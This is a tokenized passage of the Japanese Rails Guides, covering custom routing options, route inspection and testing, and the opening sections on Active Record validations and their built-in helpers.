▁Rails ▁ 3.0 . x の動作 に 戻 したい場合は 、 以下のように ` format : ▁false ` を指定する ことができます 。
▁get ▁' * pages ', ▁to : ▁' pages # show ', ▁ format : ▁false
▁NOT E : ▁この セグメント フォーマット を 必 須 に したい場合は 、 以下のように ` format : ▁true ` を指定します 。
▁get ▁' * pages ', ▁to : ▁' pages # show ', ▁ format : ▁true
▁ ルーティング で ` redirect ` を使用すると 、 ある パス を 他の あらゆる パス に リダイレクト できます 。
▁ パス に マッチする 動的 セグメント を 再 利用 して リダイレクト することもできます 。
▁ リダイレクト に ブロック を 渡す こともできます 。 この リダイレクト は 、 シンボル 化 された パス パラメータ と request オブジェクト を受け取り ます 。
▁ここで 行われている リダイレクト は 、 HTTP ステータス で言う 「 30 1 ▁" M o v ed ▁P er ma n ent ly " 」 である ことにご注意ください 。
▁ 一部の Web ブラウザ や プロキシ サーバー は この種の リダイレクト を キャッシュ すること があり 、 その 場合 リダイレクト 前 の 古 い ページに は アクセス でき なくなります 。
▁ どの 場合 であっても 、 ホスト ▁( ` http :// www . example . com ` など ) ▁ が URL の 冒 頭 で 指定 されていない 場合は 、 Rails は ▁( 以前の リクエスト ではなく ) ▁ 現在の リクエスト から 詳 細 を取得し ます 。
▁### ▁ Rack アプリケーションに ルーティング する
▁ match ▁' / application . js ', ▁to : ▁ Sprockets , ▁ v i a : ▁: all
▁Rails ルーター から 見 れば 、` Sprockets ` が ` c all ` に 応答 して ` [ status , ▁ header s , ▁ body ] ` を返す 限 り 、 ルーティング 先 が Rack アプリケーション である か アクション である か は 区別 できません 。
▁これは ` v i a : ▁: all ` の 適切な 利用 法 です 。 という のは 、 適 切 と 考え られ る すべての HTTP 動詞 を Rack アプリケーションで 扱 え るように できる からです 。
▁### ▁` root ` を使用する
▁` root ` メソッド を使用することで 、 Rails が ルート ` ' / ' ` と すべき 場所 を 指定できます 。
▁ root ▁to : ▁' pages # main '
▁ root ▁' pages # main ' ▁# ▁上の 省略 形
▁` root ` ルーティング は 、 ルーティング ファイルの 先 頭 に 記述 してください 。 root は 最も よく 使用される ルーティング であり 、 最初に マッチする 必要がある からです 。
▁NOT E : ▁` root ` ルーティング が アクションに 渡 せる のは ` GET ` リクエスト だけです 。
▁ 名前空間 や スコープ の 内 側 に root を 置 く こともできます 。
▁ root ▁to : ▁" admin # index "
▁ root ▁to : ▁" home # index "
▁### ▁ U n i code 文字列を ルーティング で使用する
▁ U n i code 文字列を ルーティング で 直接 使用 することもできます 。
▁get ▁' こ ん に ち は ', ▁to : ▁' welcome # index '
▁ リソース フル ルーティング を カスタマイズ する
▁Rails では 、 リソース フル な ヘルパー の 一般的な どの 部分 であっても 事 実 上 自由に カスタマイズ 可能です 。
▁### ▁ 使用する コントローラ を指定する
▁`: controller ` オプションは 、 リソース で使用する コントローラ を明示的に指定 します 。
▁ resources ▁: photos , ▁ controller : ▁' images '
▁上の ルーティング は 、` / photos ` で 始 ま る パス を 認 識 します が 、 ルーティング 先 を ` I m age s ` コントローラに します 。
▁| ▁ HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 名前付き ヘルパー ▁|
▁| ▁--------- ▁| ▁ ---------------- ▁| ▁- ---------------- ▁| ▁--------- ----------- ▁|
▁| ▁GET ▁| ▁ / photos ▁| ▁ images # index ▁| ▁ photos _ path ▁|
▁| ▁GET ▁| ▁ / photos / new ▁| ▁ images # new ▁| ▁ new _ photo _ path ▁|
▁| ▁ POST ▁| ▁ / photos ▁| ▁ images # create ▁| ▁ photos _ path ▁|
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁ images # show ▁| ▁ photo _ path (: id ) ▁|
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁ images # edit ▁| ▁ edit _ photo _ path (: id ) ▁|
▁| ▁ PATCH / PUT ▁| ▁ / photos / : id ▁| ▁ images # update ▁| ▁ photo _ path (: id ) ▁|
▁| ▁ DELETE ▁| ▁ / photos / : id ▁| ▁ images # destroy ▁| ▁ photo _ path (: id ) ▁|
▁NOT E : ▁この リソース への パス を生成する には ` photos _ path ` や ` new _ photo _ path ` など を使用して ください 。
▁ 名前空間 内の コントローラ は 以下のように 直接 指定 することができます 。
▁ resources ▁: user _ per m is s ions , ▁ controller : ▁' admin / user _ per m is s ions '
▁ 上 は ` Admin :: User P e rm is s ions ` に ルーティング されます 。
▁NOT E : ▁ここで サポート されている 記 法 は 、` / ` で 区切 る 「 ディレクトリ 式 」 のみ です 。
▁Ruby の 定数 表 記 法 ▁( ` controller : ▁' Admin :: User P e rm is s ions ' ` など ) ▁ を コントローラ に対して 使用する と 、 ルーティング で 問題が生じ 、 警 告 が 出力 される 可能性があります 。
▁### ▁ 制限 を指定する
▁`: const r a in t s ` オプション を使用すると 、 暗 黙 で 使用される ` id ` に対して フォーマット を指定する ことができます 。
▁上の 宣言 は `: id ` パラメータ に 制限 を加え 、 指定 した 正規表現 に のみ マッチする ようにします 。
▁従って 、 上の 例 では ` / photos /1 ` のような パス には マッチ し なくなります 。
▁ 代 わ って 、` / photos / R R 27 ` のような パス に マッチする ようになります 。
▁ ブロック フォーム を使用することで 、 多数の ルーティング に対して 1 つの 制限 を まとめ て 与え る こともできます 。
▁ const r a in t s ( id : ▁ / [ A - Z ] [ A - Z ] [ 0 - 9 ] + / ) ▁do
▁ resources ▁: photos
▁ resources ▁: account s
▁NOT E : ▁もちろん 、 この場合 であれば 「 リソース フル でない 」 ルーティング に適用 可能な 、 より 高度な 制限 を加え る こともできます 。
▁ TIP : ▁`: id ` パラメータ では ドット ` . ` を デフォルトで は 使用 できません 。 ドット は フォーマット 済み ルーティング では 区切 り 文字 として 使用される ためです 。
▁ どう しても `: id ` 内で ドット を使用したい場合 は 、 デフォルト 設定 を 上 書き する 制限 を 与え ます 。 たとえば ` id : ▁ / [ ^ \ / ] + / ` と すると 、 ス ラ ッ シ ュ 以外の すべての 文字 が 使用できます 。
▁### ▁ 名前付き ヘルパー を オーバーライド する
▁`: as ` オプション を使用すると 、 名前付き ルーティング ヘルパー を 上 書き して 異なる 名前 を使用できます 。
▁ resources ▁: photos , ▁as : ▁' images '
▁上の ルーティング では 、` / photos ` で 始 ま る ブラウザから の パス を 認 識 し 、 この リクエストを ` P h o to s ` コントローラに ルーティング します が 、 ヘルパー の 命 名 に `: as ` オプション の値 が使用されます 。
▁| ▁GET ▁| ▁ / photos ▁| ▁ photos # index ▁| ▁ images _ path ▁|
▁| ▁GET ▁| ▁ / photos / new ▁| ▁ photos # new ▁| ▁ new _ image _ path ▁|
▁| ▁ POST ▁| ▁ / photos ▁| ▁ photos # create ▁| ▁ images _ path ▁|
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁ photos # show ▁| ▁ image _ path (: id ) ▁|
▁| ▁GET ▁| ▁ / photos / : id / edit ▁| ▁ photos # edit ▁| ▁ edit _ image _ path (: id ) ▁|
▁| ▁ PATCH / PUT ▁| ▁ / photos / : id ▁| ▁ photos # update ▁| ▁ image _ path (: id ) ▁|
▁| ▁ DELETE ▁| ▁ / photos / : id ▁| ▁ photos # destroy ▁| ▁ image _ path (: id ) ▁|
▁### ▁` new ` セグメント や ` edit ` セグメント を オーバーライド する
▁ resources ▁: photos , ▁ path _ name s : ▁ { ▁ new : ▁' ma ke ', ▁ edit : ▁' change ' ▁ }
▁これにより 、 ルーティング で 以下のような パス が 認 識 できるようになります 。
▁ / photos / ma ke
▁ / photos /1/ change
▁NOT E : ▁この オプション を指定して も 、 実際の アクション 名 が変更され る わけではありません 。
▁ 変更 後 の パス を使用して も 、 ルーティング 先 は 依 然 として ` new ` アクション と ` edit ` アクション の ま ま です 。
▁ TIP : ▁この オプション による 変更を すべての ルーティング に 統 一 的 に適用 した く な った 場合は 、 スコープ を使用できます 。
▁ scope ▁ path _ name s : ▁ { ▁ new : ▁' ma ke ' ▁ } ▁do
▁# ▁ 残 り すべての ルーティング
▁### ▁ 名前付き ルーティング ヘルパー に プレフィックス を追加する
▁`: as ` オプション を使用することで 、 Rails が ルーティング に対して 生成 する 名前付き ルーティング ヘルパー 名 の 冒 頭 に 文字 を 追加 できます ▁( プレフィックス )。
▁ パス スコープ を使用する ルーティング 同士 で の名前 の 衝 突 を 避 け たい 場合に 使用 してください 。
▁ scope ▁' admin ' ▁do
▁ resources ▁: photos , ▁as : ▁' admin _ photos '
▁ ルーティング ヘルパー の グループ に プレフィックス を追加する には 、 以下のように ` scope ` メソッドで `: as ` オプション を使用します 。
▁ scope ▁' admin ', ▁as : ▁' admin ' ▁do
▁ resources ▁: photos , ▁: account s
▁ resources ▁: photos , ▁: account s
▁ 上 によって 、` admin _ photos _ path ` と ` admin _ account s _ path ` などの ルーティング が 生成されます 。 これらは ` / admin / photos ` と ` / admin / account s ` に それぞれ 割り当て られます 。
▁NOT E : ▁` name space ` スコープ を使用すると 、`: module ` や `: path ` プレフィックス に 加 え て `: as ` も 自動的に 追加 されます 。
▁ 名前付き パラメータ を持つ ルーティング に プレフィックス を追加する こともできます 。
▁ scope ▁' : user name ' ▁do
▁### ▁ ルーティング の作成 を 制限 する
▁`: only ` オプション や `: except ` オプション を使用することで 、 これらの ルーティング を 微 調 整 できます 。
▁`: only ` オプションは 、 指定された ルーティング だけ を生成する よう 指示 します 。
▁ resources ▁: photos , ▁ only : ▁ [: index , ▁: show ]
▁これで 、` / photos ` への ` GET ` リクエスト は 成功 し 、` / photos ` ▁ への ` POST ` リクエスト ▁( 通常 であれば ` create ` アクションに ルーティング されます ) ▁ は 失敗 します 。
▁`: except ` オプションは 逆 に 、 指定 した ルーティング のみ を 生成 ▁ _ しない _ ▁ よう 指示 します 。
▁ resources ▁: photos , ▁ except : ▁: destroy
▁ この場合 、` destroy ` ▁( ` / photos / : id ` への ` DELETE ` リクエスト ) ▁ を 除 いて 通常の ルーティング が 生成されます 。
▁ TIP : ▁ アプリケーションで RESTful ルーティング が 多 数 使用されている のであれば 、 それら に 適 宜 `: only ` や `: except ` を使用して 、 本当に 必要な ルーティング のみ を生成する ことで 、 メモリ 使用 量 の 節 約 と ルーティング プロセス の 速 度 向 上 が 見 込 め ます 。
▁### ▁ パス を変更する
▁` scope ` メソッド を使用することで 、` resource ` によって 生成される デフォルトの パス 名 を変更 できます 。
▁ scope ( path _ name s : ▁ { ▁ new : ▁' n e u ', ▁ edit : ▁' b e a rb e it en ' ▁ }) ▁do
▁ resources ▁: cat e g or ies , ▁ path : ▁' k at e g or i en '
▁上の ように することで 、 以下のような ` C at e g or ies ` コントローラ への ルーティング が 作成されます 。
▁| ▁ HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁ 名前付き ヘルパー ▁|
▁| ▁--------- ▁| ▁ --------------- ----------- ▁| ▁-- ---------------- ▁| ▁- ----------- ----------- ▁|
▁| ▁GET ▁| ▁ / k at e g or i en ▁| ▁categories # index ▁| ▁categories _ path ▁|
▁| ▁GET ▁| ▁ / k at e g or i en / n e u ▁| ▁categories # new ▁| ▁ new _ category _ path ▁|
▁| ▁ POST ▁| ▁ / k at e g or i en ▁| ▁categories # create ▁| ▁categories _ path ▁|
▁| ▁GET ▁| ▁ / k at e g or i en / : id ▁| ▁categories # show ▁| ▁ category _ path (: id ) ▁|
▁| ▁GET ▁| ▁ / k at e g or i en / : id / b e a rb e it en ▁| ▁categories # edit ▁| ▁ edit _ category _ path (: id ) ▁|
▁| ▁ PATCH / PUT ▁| ▁ / k at e g or i en / : id ▁| ▁categories # update ▁| ▁ category _ path (: id ) ▁|
▁| ▁ DELETE ▁| ▁ / k at e g or i en / : id ▁| ▁categories # destroy ▁| ▁ category _ path (: id ) ▁|
▁### ▁ 「 単数形 の フォーム 」 を オーバーライド する
▁ ある リソース の 「 単数形 の フォーム 」 を 定義 したい場合 、` In f le ct or ` に 活用 形 ルール を追加します 。
▁ ActiveSupport :: In f le ct or . in f le ct ions ▁do ▁| in f le ct |
▁in f le ct . ir re g ul ar ▁' to o th ', ▁' te e th '
▁### ▁ 名前付き リソース で `: as ` を使用する
▁`: as ` を使用すると 、 ネスト した ルーティング ヘルパー 内の リソース 用 に 自動生成 された 名前 を オーバーライド できます 。
▁ resources ▁: ad s , ▁as : ▁' per io d ical _ ad s '
▁上の ルーティング によって 、` magazine _ per io d ical _ ad s _ url ` や ` edit _ magazine _ per io d ical _ ad _ path ` などの ルーティング ヘルパー が 生成されます 。
▁ パラメータ
▁ ルーティング の 調 査 と テスト
▁Rails には 、 ルーティング を調べ る 機能 と テスト する 機能 が 備 わ っています 。
▁### ▁ 既存の ルール を 一覧 表示する
▁ ターミナル で ` rake ▁ routes ` コマンド を実行して も 同じ 結果を 得られ ます 。
▁ どちら の 方法 を使用した 場合 でも 、` routes . rb ` ファイルに 記 載 された 順に ルーティング が表示されます 。
▁1 つの ルーティング について 以下の 情報 が表示されます 。
▁* ▁ ルーティング 名 ▁( あ れば )
▁* ▁ 使用されている HTTP 動詞 ▁( その ルーティング が すべての HTTP 動詞 に応答する ので ない場合 )
▁* ▁ マッチする URL パターン
▁* ▁その ルーティング で使用する パラメータ
▁ 以下 は 、 ある RESTful ルーティング に対して ` rake ▁ routes ` を実行し た 結果 から 抜 粋 した ものです 。
▁ users ▁GET ▁ / users ( . : format ) ▁ users # index
▁ POST ▁ / users ( . : format ) ▁ users # create
▁ edit _ user ▁GET ▁ / users / : id / edit ( . : format ) ▁ users # edit
▁` C ON T R O L L ER ` 環境変数 を設定する ことで 、 ルーティング 一覧 の 表示 を 特定の コントローラに マ ッ プ された もの に 制限 することもできます 。
▁ TIP : ▁ 折 り 返 し が発生し ない ぐらい に 十分 大きな サイズ の ターミナル を 使用できる のであれば 、` rake ▁ routes ` コマンド の 出力 の 方が おそらく 読み やすい でしょう 。
▁### ▁ ルーティング をテストする
▁ アプリケーションの 他の 部分 と同様 、 ルーティング 部分 も テスティング 戦 略 に含め ておく べ き でしょう 。
▁Rails では 、 テスティング を 容易に するために 3 つの [ ビルトイン アサーション ]( http :// api . rubyonrails . org / classes / ActionDispatch / A s s er tion s / R out ing A s s er tion s . html ) ▁ が 用意されてい ます 。
▁* ▁` assert _ generate s `
▁* ▁` assert _ re co g n ize s `
▁* ▁` assert _ routing `
▁#### ▁` assert _ generate s ` アサーション
▁` assert _ generate s ` は 、 特定の オプション の 組み合わせ を使用した 場合に 特定の パス が生成され ること 、 そして それら が デフォルトの ルーティング でも カスタム ルーティング でも 使用できる こと をテストする アサーション ▁( assert , ▁ assert ion : ▁ 主 張 ・ 検証 とも ) ▁ です 。
▁ assert _ generate s ▁' / photos /1 ', ▁ { ▁ controller : ▁' photos ', ▁ action : ▁' show ', ▁id : ▁' 1 ' ▁ }
▁ assert _ generate s ▁' / about ', ▁ controller : ▁' pages ', ▁ action : ▁' about '
▁#### ▁` assert _ re co g n ize s ` アサーション
▁` assert _ re co g n ize s ` は ` assert _ generate s ` と 逆 方 向 の テスティング を行います 。
▁ 与えられた パス が 認 識 可能 であること 、 アプリケーションの 特定の 場所 に ルーティング される こと をテストする アサーション です 。
▁ assert _ re co g n ize s ( { ▁ controller : ▁' photos ', ▁ action : ▁' show ', ▁id : ▁' 1 ' ▁ } , ▁' / photos /1 ')
▁ 引数 で `: method ` を使用して HTTP 動詞 を指定する こともできます 。
▁ assert _ re co g n ize s ( { ▁ controller : ▁' photos ', ▁ action : ▁' create ' ▁ } , ▁ { ▁ path : ▁' photos ', ▁ method : ▁: post ▁ })
▁#### ▁` assert _ routing ` アサーション
▁` assert _ routing ` アサーション は 、 ルーティング を 2 つの 観 点 ▁( 与えられた パス によって オプション が生成され ること 、 その オプション によって 元の パス が生成され ること ) ▁ から チェック します 。
▁つまり 、` assert _ generate s ` と ` assert _ re co g n ize s ` の 機能を 組み合わせ た もの になります 。
▁ assert _ routing ( { ▁ path : ▁' photos ', ▁ method : ▁: post ▁ } , ▁ { ▁ controller : ▁' photos ', ▁ action : ▁' create ' ▁ })
▁Active ▁Record ▁ バリデーション
▁この ガイド では 、 Active ▁Record のバリデーション ▁( 検証 : ▁ validation ) ▁ 機能 を使用して 、 オブジェクトが データベースに保存 される 前に オブジェクトの 状態 を 検証 する方法について 説明します 。
▁* ▁ ビルトイン の Active ▁Record バリデーション ヘルパー の 使用
▁* ▁ カスタム のバリデーション メソッド の作成
▁* ▁ バリデーション プロセス で 生成された エラーメッセージ の 取り 扱 い
▁ バリデーション の概要
▁ き わ め て シンプルな バリデーション の例 を 以下 に 紹 介 します 。
▁ Person . create ( name : ▁" John ▁D o e ") . valid ?
▁ Person . create ( name : ▁nil ). valid ?
▁ 上 から わかるように 、 この バリデーション では ` Person ` に ` name ` 属性 がない 場合に 無効 であることを 知 ら せ ます 。
▁2 つ目の ` Person ` は データベースに保存 されません 。
▁ バリデーション の詳細 を 説明 する 前に 、 アプリケーション 全体 において バリデーション が い か に 重要 である か について説明し ます 。
▁### ▁ バリデーション を行なう 理由
▁ バリデーション は 、 正しい データ だけ をデータベースに保存する ために 行われます 。
▁たとえば 、 自分の アプリケーションで 、 すべての ユーザー には 必ず 電 子 メールアドレス と メ ー リ ング リスト アドレス が 必要 だと します 。
▁ 正しい データ だけ をデータベースに保存する のであれば 、 モデル レベル で バリデーション を実行する の が 最 適 です 。
▁ モデル レベル で のバリデーション は 、 データベースに 依 存 せ ず 、 エ ンド ユーザーが バ イ パス すること も でき ず 、 テスト も 保 守 も 容 易 だ からです 。
▁Rails では バリデーション を簡単に 利用できる よう 、 一般に 利用 可能な ビルトイン ヘルパー が 用 意 され ており 、 自 前 のバリデーション メソッド を作成する ことも できる ようになっています 。
▁ データ をデータベースに保存する 前に バリデーション を実行する 方法は 、 他にも データベース ネ イ テ ィ ブ の 制 約 機能 、 クライアント 側 で のバリデーション 、 コントローラ レベル のバリデーション など 、 多くの 方法 があります 。
▁ それぞれの メ リ ッ ト と デ メ リ ッ ト は 以下の とおりです 。
▁* ▁ クライアント 側 で のバリデーション は 扱 い や す く 便利です が 、 一般に 単 独 では 信 頼 性 が 不 足 します 。
▁ JavaScript を使用して バリデーション を実装する 場合 、 ユーザーが JavaScript をオフに して し ま えば バ イ パス され てしまいます 。
▁ただし 、 他の 方法 と 併 用 する のであれば 、 クライアント 側 で のバリデーション は ユーザーに 即 座 に フィード バ ッ ク を返す ための 便利な 方法 となる でしょう 。
▁* ▁ コントローラ レベル のバリデーション は 一度 は や って み た くなる ものです が 、 たい て い 手 に 負 え なく なり 、 テスト も 保 守 も 困 難 になり が ち です 。
▁ アプリケーションの 寿 命 を 永 ら え 、 保 守 作業 を 苦 痛 な もの に し ないように するために は 、 コントローラ のコード 量 は 可能な 限 り 減 ら すべき です 。
▁ 上 で紹介した その他 のバリデーション については 、 特定の 状 況 に応じて 適 宜 追加 してください 。
▁Rails チ ー ム は 、 ほとんど の場合 モデル レベル のバリデーション が 最も 適 切 である と 考え ています 。
▁### ▁ バリデーション 実行 時の 動作
▁Active ▁Record の オブジェクト には 2 種類 あります 。 オブジェクトが データベースの 行 ( row ) に 対応 している もの と 、 そう でない ものです 。
▁たとえば 、` new ` メソッドを使用して 新しく オブジェクトを 作成した だけで は 、 オブジェクトは データベースに 属 していません 。
▁` save ` メソッドを 呼 ぶ ことで 、 オブジェクトは 適切な データベースの テーブル に 保存されます 。
▁Active ▁Record の ` new _ record ?` インスタンス メソッドを使用して 、 オブジェクトが 既に データベース 上 にある かどうかを確認 できます 。
▁ 次の 単純な Active ▁Record クラス を 例 に 取 って みましょう 。
▁` rails ▁console ` の 出力 で 様 子 を 観 察 してみます 。
▁ >> ▁ p ▁= ▁ Person . new ( name : ▁" John ▁D o e ")
▁=> ▁#< Person ▁id : ▁nil , ▁name : ▁" John ▁D o e ", ▁ created _ at : ▁nil , ▁ updated _ at : ▁nil >
▁ >> ▁ p . new _ record ?
▁ >> ▁ p . save
▁=> ▁false
▁ 新 規 レコード を作成して 保存 すると 、 SQL の ` IN S ER T ` 操作 が データベースに 送信 されます 。
▁ 既存の レコード を更新する と 、 SQL の ` U P DAT E ` 操作 が 送信 されます 。
▁ バリデーション は 、 SQL の データベース への 送信 前に 行う のが普通です 。
▁ バリデーション のいずれか が 失敗する と 、 オブジェクトは 無効 ( invalid ) と マーク され 、 Active ▁Record で の ` IN S ER T ` や ` U P DAT E ` 操作 は 行 わ れ ません 。
▁これにより 、 無効な オブジェクトが データベースに保存 される ことを 防止 します 。
▁ オブジェクトの 作成 、 保存 、 更新 時に 特定の バリデーション を実行する こともできます 。
▁C A UT I ON : ▁ データベース 上の オブジェクトの 状態 を 変え る 方法は 1 つ とは 限 り ません 。
▁ メソッド には 、 バリデーション を トリガ する もの と 、 しない もの があります 。
▁この 点に注意 して お か ない と 、 バリデーション が 設定 されている にも か か わ らず 、 データベース 上の オブジェクトが 無効な 状態 になっ てしまう 可能性があります 。
▁以下の メソッド では バリデーション が トリガ され 、 オブジェクトが 有効な 場合に のみ データベースに保存 されます 。
▁* ▁` create `
▁* ▁` create !
▁* ▁` save `
▁* ▁` save !
▁* ▁` update `
▁* ▁` update !
▁ 破 壊 的な メソッド ( ` save !` など ) では 、 レコード が 無効な 場合に 例外が発生します 。
▁ 非 破 壊 的な メソッド では 無効な 場合に 例外を発生 しません 。 ` save ` と ` update ` は 無効な 場合に ` false ` を返し 、` create ` は 無効な 場合に 単 に そのオブジェクト を返します 。
▁### ▁ バリデーション の スキップ
▁以下の メソッドは バリデーション を 行 わ ずに スキップ します 。 オブジェクトの 保存 は 、 有効 無効 に か か わ らず 行われます 。
▁これらの メソッドの 使用 には 注意 が必要です 。
▁* ▁` de c re m ent !
▁* ▁` de c re m ent _ counter `
▁* ▁` in c re m ent !
▁* ▁` in c re m ent _ counter `
▁* ▁` to g g le !
▁* ▁` to u ch `
▁* ▁` update _ all `
▁* ▁` update _ attribute `
▁* ▁` update _ column `
▁* ▁` update _ column s `
▁* ▁` update _ counter s `
▁ 実は 、` save ` に ` validate : ▁false ` を 引数として 与え ると 、` save ` のバリデーション を スキップ すること が できてしまいます 。
▁この 手法 は 注意 深 く 使用 する必要があります 。
▁* ▁` save ( validate : ▁false ) `
▁### ▁` valid ?` と ` invalid ?
▁Rails で オブジェクトが 有効 ( valid ) である かどうか を検証する には 、` valid ?` メソッド を使用します 。
▁このメソッドは 単 独 で 使用できます 。 ` valid ?` を実行すると バリデーション が トリガ され 、 オブジェクト に エラー が ない場合は true が 返 され 、 そう で なければ false が返されます 。
▁これは 以下のように 実装 できます 。
▁Active ▁Record で バリデーション が 行われた 後 は 、` errors . messages ` インスタンス メソッドを使用すると 、 発生 した エラー にアクセス できます 。 このメソッドは エラー の コレクション を返します 。
▁ 定義 上 は 、 バリデーション 実行 後に コレクション が 空 になった 場合は 有効 です 。
▁` new ` を使用して インスタンス 化 された オブジェクトは 、 仮 に 技術 的に 無効 であっても エラー は 報 告 され ないので 、 注意 が必要です 。 ` new ` では バリデーション は 実行 されません 。
▁ >> ▁ p ▁= ▁ Person . new
▁# ▁=> ▁#< Person ▁id : ▁nil , ▁name : ▁nil >
▁ >> ▁ p . errors . messages
▁ >> ▁ p . valid ?
▁# ▁=> ▁ { name : [ " 空 欄 には できません "] }
▁ >> ▁ p ▁= ▁ Person . create
▁ >> ▁ p . save !
▁# ▁=> ▁ActiveRecord :: Re c or d In valid : ▁ V al id ation ▁ failed : ▁ 空 欄 には できません
▁ >> ▁ Person . create !
▁` invalid ?` は 単なる ` valid ?` の 逆 の動作 です 。
▁このメソッドは バリデーション を トリガ し 、 オブジェクト で エラーが発生し た場合 は true を 、 そう で なければ false を返します 。
▁### ▁` errors [ ] `
▁` errors [: attribute ] ` を使用して 、 特定の オブジェクトの 属性 が 有効 である かどうかを確認 できます 。
▁このメソッドは 、`: attribute ` の すべての エラー の配列 を返します 。
▁ 指定された 属性 で エラーが発生し なかった 場合は 、 空 の配列 が返されます 。
▁このメソッド が 便利な のは 、 ▁ _ after _ ▁ で 始 ま る バリデーション を実行する 場合 だけです 。 このメソッドは エラー の コレクション を調べ る だけで 、 バリデーション そのもの を トリガ しない からです 。
▁このメソッドは 、 前 述 の ` ActiveRecord :: Base # invalid ?` メソッドと は 異なります 。 このメソッドは オブジェクト 全体 の 正 当 性 については 確認 しない ためです 。
▁ オブジェクトの 個 別の 属性 について エラー がある かどうか だけ を調べ ます 。
▁ >> ▁ Person . new . errors [: name ] . any ?
▁ >> ▁ Person . create . errors [: name ] . any ?
▁ より 高度な レベル で のバリデーション エラー については 、[ バリデーション エラー の 取り 扱 い ]( # バリデーション エラー に対応する ) セクション を参照してください 。
▁ それ まで は 、 Rails が デフォルトで 提 供 する ビルトイン のバリデーション ヘルパー を 中 心 に 解説します 。
▁ バリデーション ヘルパー
▁-- ----------------
▁Active ▁Record には 、 クラス 定義 の 内 側 で 直接 使用できる 定義 済み のバリデーション ヘルパー が 多 数 用意されてい ます 。
▁これらの ヘルパーは 、 共通 のバリデーション ルール を提供します 。
▁ バリデーション が 失敗する たびに 、 オブジェクトの ` errors ` コレクション に エラーメッセージ が追加され 、 その メッセージ は 、 バリデーション が行われ る 属性 に 関連付け られます 。
▁ どの ヘルパー も 任意の 数 の 属性を 受け 付け る ことができる ので 、 1 行 の コードを 書く だけで 多くの 属性 に対して 同じ バリデーション を 実行 できます 。
▁`: on ` オプション と `: message ` オプションは どの ヘルパー でも 使用できます 。 これらの オプションは それぞれ 、 バリデーション を実行する タ イ ミ ング と 、 バリデーション 失敗 時に ` errors ` コレクション に追加する メッセージ を指定します 。
▁`: on ` オプションは `: create ` または `: update ` のいずれか の 値を 取り ます 。
▁ バリデーション ヘルパー には 、 それぞれ デフォルトの エラーメッセージ が 用意されてい ます 。
▁`: message ` オプション が 使用 されていない 場合は デフォルトの メッセージ が使用されます 。
▁ 利用 可能な ヘルパー を 1 つ ず つ 見 て い き ましょう 。
▁### ▁` accept an ce `
▁このメソッドは 、 フォーム が 送信された ときに ユーザー インターフェイス 上の チェックボックス が オン になっている かどうかを 検証 します 。
▁ ユーザーに サービス 利用 条 項 への 同 意 、 何らかの 文 書 に 目 を 通 す こと など を 義 務 付け る の に 使用する の が 典 型 的な 利用 法 です 。
▁この バリデーション は Web アプリケーション 特 有 の もの なので 、 ' accept an ce ' は データベースに保存 する必要はありません 。 保存 用の フィールド を作成し なかった 場合 、 ヘルパーは 単 に 仮 想 の 属性 を作成します 。
▁validates ▁: ter m s _ of _ s er v i ce , ▁ accept an ce : ▁true
▁この ヘルパー の デフォルト エラーメッセージ は ▁ _ " m us t ▁be ▁ accept ed " _ ▁ です 。
▁この ヘルパー では `: accept ` オプション を使用できます 。 この オプションは 、「 受 付 済み 」 を表す 値 を指定します 。
▁デフォルトは "1" ですが 、 容易に 変更 できます 。
▁validates ▁: ter m s _ of _ s er v i ce , ▁ accept an ce : ▁ { ▁ accept : ▁' y es ' ▁ }
▁### ▁` validates _ associate d `
▁ モデル が 他の モデルに 関連付け られ て いて 、 両方 の モデル に対して バリデーション を実行する 必要がある 場合は この ヘルパー を使用します 。
▁ オブジェクト を保存し よう と すると 、 関連付けられている オブジェクト ごとに ` valid ?` が 呼び出され ます 。
▁class ▁ L i br ary ▁< ▁ActiveRecord :: Base
▁has _ many ▁: books
▁validates _ associate d ▁: books
▁この バリデーション は 、 あらゆる 種類 の 関連付け に対して 使用できます 。
▁C A UT I ON : ▁` validates _ associate d ` は 関連付け の 両 側 の オブジェクト では 実行 しないでください 。
▁ 関連付け の 両 側 で この ヘルパー を使用すると 無 限 ル ー プ になります 。
▁` validates _ associate d ` の デフォルト エラーメッセージ は ▁ _ " is ▁ invalid " _ ▁ です 。
▁ 関連付けられたオブジェクト にも 自分の ` errors ` コレクション が含まれ る ので 、 エラー は 呼び出し 元の モデル まで は 伝 わ り ません 。
▁### ▁` confirmation `
▁この ヘルパーは 、 2 つの テキスト フィールド が 完全に 一致する 内容 を 受け 取 る 必要がある 場合に 使用します 。
▁たとえば 、 メールアドレス や パスワード で 、 確認 フィールド を使用すると します 。
▁この バリデーション ヘルパーは 仮 想 の 属性 を作成します 。 その 属性 の名前 は 、 確認 したい 属性 名 に ▁" _ confirmation " ▁ を追加した もの になります 。
▁validates ▁: email , ▁ confirmation : ▁true
▁ ビュー テンプレート で 以下のような フィールド を 用 意 します 。
▁<%= ▁ text _ field ▁: person , ▁: email ▁%>
▁<%= ▁ text _ field ▁: person , ▁: email _ confirmation ▁%>
▁この チェック は 、` email _ confirmation ` が ` nil ` で ない場合 のみ 実 施 されます 。
▁ 確認 を 必 須 に するには 、 確認 用の 属性 について 存 在 チェック も 追加 しておく ように してください 。 ` presence ` を使用した 存 在 チェック については この後 解説します 。
▁validates ▁: email _ confirmation , ▁ presence : ▁true
▁この ヘルパー の デフォルト メッセージ は ▁ _ " do es n ' t ▁ match ▁ confirmation " _ ▁ です 。
▁### ▁` ex c l us ion `
▁この ヘルパーは 、 与えられた 集合 に 属性 の値 が含まれ て 「 い ない 」 ことを 検証 します 。
▁ 集合 として は 任意の enumera b le オブジェクトが 使用できます 。
▁class ▁ Account ▁< ▁ActiveRecord :: Base
▁validates ▁: sub do main , ▁ ex c l us ion : ▁ { ▁in : ▁% w ( www ▁ us ▁ ca ▁ j p ) ,
▁ message : ▁" % { value } は 予 約 済み です "
▁` ex c l us ion ` ヘルパー の `: in ` オプション には 、 バリデーション を 行った 属性 の値 に含め たくない 値 の 集合 を指定します 。
▁`: in ` オプション には `: with in ` という エイリアス も あり 、 好 み に応じて どちら でも 使用できます 。
▁上の 例 では 、`: message ` オプション を使用して 属性 の値 を含め る 方法 を 示 しています 。
▁デフォルトのエラーメッセージは ▁ _ " is ▁ re s er v ed " _ ▁ です 。
▁### ▁` format `
